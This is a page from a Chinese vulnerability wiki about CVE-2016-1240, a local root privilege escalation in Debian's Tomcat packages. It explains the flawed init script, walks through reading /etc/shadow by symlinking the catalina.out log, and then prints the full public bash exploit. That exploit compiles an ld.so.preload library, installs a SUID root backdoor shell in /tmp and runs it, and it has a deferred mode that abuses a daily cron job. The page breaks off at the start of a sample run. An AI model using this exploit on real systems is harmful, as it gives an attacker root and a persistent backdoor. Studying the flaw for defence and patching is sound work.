<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Tomcat/%EF%BC%88CVE-2016-1240%EF%BC%89Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2016-1240）Tomcat本地提权漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2016-1240\uff09Tomcat\u672c\u5730\u63d0\u6743\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2016-8735%EF%BC%89Tomcat%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2016-8735%EF%BC%89Tomcat%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2016-8735）Tomcat 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-link">
        通过jmx攻击Tomcat
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2016-1240tomcat">（CVE-2016-1240）Tomcat本地提权漏洞<a class="headerlink" href="#cve-2016-1240tomcat" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使
deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：<code>/etc/init.d/tocat*</code>利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限！</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Tomcat 8 \&lt;= 8.0.36-2 Tomcat 7 \&lt;= 7.0.70-2 Tomcat 6 \&lt;=
6.0.45+dfsg-1~deb8u1</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>Debian系统的Linux上管理员通常利用apt-get进行包管理，CVE-2016-1240这一漏洞其问题出在Tomcat的deb包中,使用deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat\&lt;版本号&gt;.sh。利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。
现在我们查看文件 /etc/init.d/tomcat7 操作如下： 首先我们使用
Evrething搜索<code>xshell</code>，选中xshell.exe运行xshell，然后连接上目标机的低权限用户tomcat7，账号是tomcat7，密码是：tomcat7。</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId25.gif" /></p>
<p>然后执行命令<code>whoami</code>，可以看到，现在是tomcat7的权限，也就是低权限账户</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId26.gif" /></p>
<p>然后执行命令<code>vim /etc/init.d/tomcat7</code>,
然后按<code>Esc</code>键,接下来输入英文状态下的字符冒号: <code>set number</code>,找到171行。</p>
<blockquote>
<p>**小提示:**vim是一个文本编辑器，<code>vim /etc/init.d/tomcat7</code>的意思是编辑/etc/init.d/文件夹下的tomcat7文件。</p>
</blockquote>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId27.gif" /></p>
<p>其造成漏洞核心代码如下：</p>
<div class="codehilite"><pre><span></span><code><span class="gh">#</span> Run the catalina.sh script as a daemon 
set +e 
touch &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out
chown $TOMCAT6_USER &quot;$CATALINA_PID&quot; &quot;$CATALINA_BASE&quot;/logs/catalina.out
</code></pre></div>

<p>我们阅读上面的shell脚本</p>
<ul>
<li>
<p>第一行，<code>set +e</code>,要知道<code>set +e</code>是什么意思，得先清楚set -e的含义：
    使用set更改shell特性时，符号\"+\"和\"-\"的作用分别是打开和关闭指定的模式,<code>set -e</code>的意思是若指令传回值不等于0，则立即退出shell，而<code>set +e</code>的意思反之</p>
</li>
<li>
<p>第二行，touch是创建文件夹的意思，创建了catalina.out日志文件，前面的两个字符串定位了PID和BASE，涉及到其他变量这里不做探讨</p>
</li>
<li>
<p>第三行，chown是改变文件夹权限的命令，它将catalina.out日志文件的所述用户更改为低权限用户</p>
</li>
</ul>
<p>这个脚本看似是没有什么问题的。但是从上面的脚本可以得出三点信息：</p>
<ol>
<li>
<p>这个脚本运行时的权限必然是root权限。因为普通用户是无法使用<code>chown</code>命令，也就是没有更高的权限。</p>
</li>
<li>
<p>该脚本使用touch命令创建文件，此时存在以下：文件存在、不存在、存在为符号链接等情况，当文件为符号链接时会默认地对链接的文件进行操作。</p>
</li>
<li>
<p>脚本运行完毕后Tomcat服务器启动，此时catalina.out这个log文件的所属用户为tomcat，所属组为root。</p>
</li>
</ol>
<p>综述上述，这就给漏洞利用创造了可能。</p>
<p>接下来我们来验证是否可以利用：</p>
<p>当前的用户为tomcat7。这就是说我们能够更改所属用户为tomcat7的catalina.out这个log文件的内容和属性。
更改它的属性，让他指向/etc/shadow/文件夹下，现在我们创建一个指向
/etc/shadow 的符号链接。
使用命令<code>ln -fs /etc/shadow /var/log/tomcat7/catalina.out</code>,这时候就可以在/etc/shadow下创建一个链接，就相当于Windows的快捷方式一样。</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>此时我们查看文件cataline.out的内容，此时是权限不够，禁止读取cataline.out的内容的：</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>现在我们需要登陆root账户重启tomcat。登陆方法与登陆Tomcat7
用户相同，账号为：root, 密码为：123456 。重启Tomcat的命令为：</p>
<div class="codehilite"><pre><span></span><code>service tomcat7 restart
</code></pre></div>

<p>重启成功之后我们再次使用<code>低权限用户</code>读取cataline.out的内容：使用命令</p>
<div class="codehilite"><pre><span></span><code><span class="n">head</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">tomcat6</span><span class="o">/</span><span class="n">catalina</span><span class="o">.</span><span class="n">out</span>
</code></pre></div>

<p>使用head命令可以输出文件前十行的内容，而<code>cat</code>命令则是预览文件的全部内容。</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId30.gif" /></p>
<p>**原理:**当Tomcat服务重启时，系统默认重新加载<code>/var/log/tomcat6/catalina.out</code>脚本，由于此时tomcat的日志文件指向了<code>/etc/shadow文件</code>;
而该文件就是我们之前创建的链接文件，而链接文件属于Tomcat7这个<code>低权限用户</code>，因此，我们就可以查看其中内容了。</p>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>本步将使用poc根据Tomcat7漏洞进行提权</p>
<h4 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="c1">#</span>
<span class="c1"># Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit</span>
<span class="c1">#</span>
<span class="c1"># CVE-2016-1240</span>
<span class="c1">#</span>
<span class="c1"># Discovered and coded by:</span>
<span class="c1">#</span>
<span class="c1"># Dawid Golunski</span>
<span class="c1"># http://legalhackers.com</span>
<span class="c1">#</span>
<span class="c1"># This exploit targets Tomcat (versions 6, 7 and 8) packaging on </span>
<span class="c1"># Debian-based distros including Debian, Ubuntu etc.</span>
<span class="c1"># It allows attackers with a tomcat shell (e.g. obtained remotely through a </span>
<span class="c1"># vulnerable java webapp, or locally via weak permissions on webapps in the </span>
<span class="c1"># Tomcat webroot directories etc.) to escalate their privileges to root.</span>
<span class="c1">#</span>
<span class="c1"># Usage:</span>
<span class="c1"># ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]</span>
<span class="c1">#</span>
<span class="c1"># The exploit can used in two ways:</span>
<span class="c1">#</span>
<span class="c1"># -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly</span>
<span class="c1"># gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. </span>
<span class="c1"># It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up</span>
<span class="c1"># a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)</span>
<span class="c1">#</span>
<span class="c1"># -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to </span>
<span class="c1"># /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. </span>
<span class="c1"># Attackers can come back at a later time and check on the /etc/default/locale file. Upon a </span>
<span class="c1"># Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can</span>
<span class="c1"># then add arbitrary commands to the file which will be executed with root privileges by </span>
<span class="c1"># the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default </span>
<span class="c1"># Ubuntu/Debian Tomcat installations).</span>
<span class="c1">#</span>
<span class="c1"># See full advisory for details at:</span>
<span class="c1"># http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html</span>
<span class="c1">#</span>
<span class="c1"># Disclaimer:</span>
<span class="c1"># For testing purposes only. Do no harm.</span>
<span class="c1">#</span>

<span class="nv">BACKDOORSH</span><span class="o">=</span><span class="s2">&quot;/bin/bash&quot;</span>
<span class="nv">BACKDOORPATH</span><span class="o">=</span><span class="s2">&quot;/tmp/tomcatrootsh&quot;</span>
<span class="nv">PRIVESCLIB</span><span class="o">=</span><span class="s2">&quot;/tmp/privesclib.so&quot;</span>
<span class="nv">PRIVESCSRC</span><span class="o">=</span><span class="s2">&quot;/tmp/privesclib.c&quot;</span>
<span class="nv">SUIDBIN</span><span class="o">=</span><span class="s2">&quot;/usr/bin/sudo&quot;</span>

<span class="k">function</span><span class="w"> </span>cleanexit<span class="w"> </span><span class="o">{</span>
<span class="w">    </span><span class="c1"># Cleanup </span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Cleaning up...&quot;</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$PRIVESCSRC</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$PRIVESCLIB</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$TOMCATLOG</span>
<span class="w">    </span>touch<span class="w"> </span><span class="nv">$TOMCATLOG</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="m">2</span>&gt;/dev/null
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Job done. Exiting with code </span><span class="nv">$1</span><span class="s2"> \n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="nv">$1</span>
<span class="o">}</span>

<span class="k">function</span><span class="w"> </span>ctrl_c<span class="o">()</span><span class="w"> </span><span class="o">{</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">0</span>
<span class="o">}</span>

<span class="c1">#intro </span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span>

<span class="c1"># Args</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-lt<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Exploit usage: \n\n</span><span class="nv">$0</span><span class="s2"> path_to_catalina.out [-deferred]\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$2</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;-deferred&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nv">mode</span><span class="o">=</span><span class="s2">&quot;deferred&quot;</span>
<span class="k">else</span>
<span class="w">    </span><span class="nv">mode</span><span class="o">=</span><span class="s2">&quot;active&quot;</span>
<span class="k">fi</span>

<span class="c1"># Priv check</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Starting the exploit in [\033[94m</span><span class="nv">$mode</span><span class="s2">\033[0m] mode with the following privileges: \n`id`&quot;</span>
id<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>tomcat
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>

<span class="c1"># Set target paths</span>
<span class="nv">TOMCATLOG</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>!<span class="w"> </span>-f<span class="w"> </span><span class="nv">$TOMCATLOG</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] The specified Tomcat catalina.out log (</span><span class="nv">$TOMCATLOG</span><span class="s2">) doesn&#39;t exist. Try again.\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Target Tomcat log file set to </span><span class="nv">$TOMCATLOG</span><span class="s2">&quot;</span>

<span class="c1"># [ Deferred exploitation ]</span>

<span class="c1"># Symlink the log file to /etc/default/locale file which gets executed daily on default</span>
<span class="c1"># tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.</span>
<span class="c1"># Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been</span>
<span class="c1"># restarted and file owner gets changed.</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$mode</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;deferred&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$TOMCATLOG</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/default/locale<span class="w"> </span><span class="nv">$TOMCATLOG</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Couldn&#39;t remove the </span><span class="nv">$TOMCATLOG</span><span class="s2"> file or create a symlink.&quot;</span>
<span class="w">        </span>cleanexit<span class="w"> </span><span class="m">3</span>
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w">  </span><span class="s2">&quot;\n[+] Symlink created at: \n`ls -l </span><span class="nv">$TOMCATLOG</span><span class="s2">`&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w">  </span><span class="s2">&quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;\n    you&#39;ll be able to add arbitrary commands to the file which will get executed with root privileges&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can&#39;t wait ;)</span>
<span class="s2"> \n\n&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span>
<span class="k">fi</span>

<span class="c1"># [ Active exploitation ]</span>

<span class="nb">trap</span><span class="w"> </span>ctrl_c<span class="w"> </span>INT
<span class="c1"># Compile privesc preload library</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Compiling the privesc shared library (</span><span class="nv">$PRIVESCSRC</span><span class="s2">)&quot;</span>
cat<span class="w"> </span><span class="s">&lt;&lt;_solibeof_&gt;$PRIVESCSRC</span>
<span class="s">#define _GNU_SOURCE</span>
<span class="s">#include &lt;stdio.h&gt;</span>
<span class="s">#include &lt;sys/stat.h&gt;</span>
<span class="s">#include &lt;unistd.h&gt;</span>
<span class="s">#include &lt;dlfcn.h&gt;</span>
<span class="s">uid_t geteuid(void) {</span>
<span class="s">    static uid_t  (*old_geteuid)();</span>
<span class="s">    old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span>
<span class="s">    if ( old_geteuid() == 0 ) {</span>
<span class="s">        chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span>
<span class="s">        chmod(&quot;$BACKDOORPATH&quot;, 04777);</span>
<span class="s">        unlink(&quot;/etc/ld.so.preload&quot;);</span>
<span class="s">    }</span>
<span class="s">    return old_geteuid();</span>
<span class="s">}</span>
<span class="s">_solibeof_</span>
gcc<span class="w"> </span>-Wall<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span><span class="nv">$PRIVESCLIB</span><span class="w"> </span><span class="nv">$PRIVESCSRC</span><span class="w"> </span>-ldl
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Failed to compile the privesc lib </span><span class="nv">$PRIVESCSRC</span><span class="s2">.&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">2</span><span class="p">;</span>
<span class="k">fi</span>

<span class="c1"># Prepare backdoor shell</span>
cp<span class="w"> </span><span class="nv">$BACKDOORSH</span><span class="w"> </span><span class="nv">$BACKDOORPATH</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l </span><span class="nv">$BACKDOORPATH</span><span class="s2">`&quot;</span>

<span class="c1"># Safety check</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">2</span>
<span class="k">fi</span>

<span class="c1"># Symlink the log file to ld.so.preload</span>
rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$TOMCATLOG</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="nv">$TOMCATLOG</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Couldn&#39;t remove the </span><span class="nv">$TOMCATLOG</span><span class="s2"> file or create a symlink.&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">3</span>
<span class="k">fi</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Symlink created at: \n`ls -l </span><span class="nv">$TOMCATLOG</span><span class="s2">`&quot;</span>

<span class="c1"># Wait for Tomcat to re-open the logs</span>
<span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">&quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w">  </span><span class="s2">&quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)</span>
<span class="s2"> &quot;</span>
<span class="k">while</span><span class="w"> </span>:<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>
<span class="w">    </span>sleep<span class="w"> </span><span class="m">0</span>.1
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-f<span class="w"> </span>/etc/ld.so.preload<span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PRIVESCLIB</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="k">fi</span>
<span class="k">done</span>

<span class="c1"># /etc/ld.so.preload file should be owned by tomcat user at this point</span>
<span class="c1"># Inject the privesc.so shared library to escalate privileges</span>
<span class="nb">echo</span><span class="w"> </span><span class="nv">$PRIVESCLIB</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Adding </span><span class="nv">$PRIVESCLIB</span><span class="s2"> shared lib to /etc/ld.so.preload&quot;</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span>

<span class="c1"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Escalating privileges via the </span><span class="nv">$SUIDBIN</span><span class="s2"> SUID binary to get root!&quot;</span>
sudo<span class="w"> </span>--help<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span>&gt;/dev/null

<span class="c1"># Check for the rootshell</span>
ls<span class="w"> </span>-l<span class="w"> </span><span class="nv">$BACKDOORPATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>rws<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>root
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$?</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l </span><span class="nv">$BACKDOORPATH</span><span class="s2">`&quot;</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n\033[94mPlease tell me you&#39;re seeing this too ;)</span>
<span class="s2">  \033[0m&quot;</span>
<span class="k">else</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[!] Failed to get root&quot;</span>
<span class="w">    </span>cleanexit<span class="w"> </span><span class="m">2</span>
<span class="k">fi</span>

<span class="c1"># Execute the rootshell</span>
<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;\n[+] Executing the rootshell </span><span class="nv">$BACKDOORPATH</span><span class="s2"> now! \n&quot;</span>
<span class="nv">$BACKDOORPATH</span><span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;rm -f /etc/ld.so.preload; rm -f </span><span class="nv">$PRIVESCLIB</span><span class="s2">&quot;</span>
<span class="nv">$BACKDOORPATH</span><span class="w"> </span>-p

<span class="c1"># Job done.</span>
cleanexit<span class="w"> </span><span class="m">0</span>
</code></pre></div>

<h4 id="poc_1">poc运行示例：<a class="headerlink" href="#poc_1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="n">tomcat7</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">$</span><span class="w"> </span><span class="n">id</span>
